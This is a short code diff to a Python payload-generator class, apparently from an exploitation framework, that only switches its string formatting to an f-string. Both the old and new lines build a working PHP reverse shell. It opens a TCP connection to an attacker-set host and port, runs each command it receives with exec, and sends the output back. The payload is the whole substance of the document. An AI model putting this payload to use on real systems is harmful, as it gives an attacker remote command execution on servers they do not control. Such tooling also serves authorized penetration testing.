@@ -21,6 +21,6 @@ class Payload(ReverseTCPPayloadMixin, GenericPayload):
 
     def generate(self):
         return (
-            "$s=fsockopen(\"tcp://{}\",{});".format(self.lhost, self.lport) +
-            "while(!feof($s)){exec(fgets($s),$o);$o=implode(\"\\n\",$o);$o.=\"\\n\";fputs($s,$o);}"
+            f'$s=fsockopen(\"tcp://{self.lhost}\",{self.lport});'
+            + "while(!feof($s)){exec(fgets($s),$o);$o=implode(\"\\n\",$o);$o.=\"\\n\";fputs($s,$o);}"
         )
